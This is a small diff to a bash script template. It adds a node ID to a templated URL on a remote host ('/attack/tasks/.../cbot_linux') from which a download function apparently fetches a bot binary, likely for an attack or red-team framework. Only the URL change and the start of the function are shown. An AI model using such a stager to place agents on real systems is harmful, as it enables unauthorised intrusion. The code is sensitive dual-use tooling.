@@ -1,7 +1,8 @@
 #!/usr/bin/env bash
 
-download_cbot_uri="http://{{.RHost}}:{{.FPort}}/attack/tasks/{{.TaskId}}/cbot_linux"
 pnodeId=$1
+
+download_cbot_uri="http://{{.RHost}}:{{.FPort}}/attack/tasks/{{.TaskId}}/$pnodeId/cbot_linux"
 
 function download() {
 
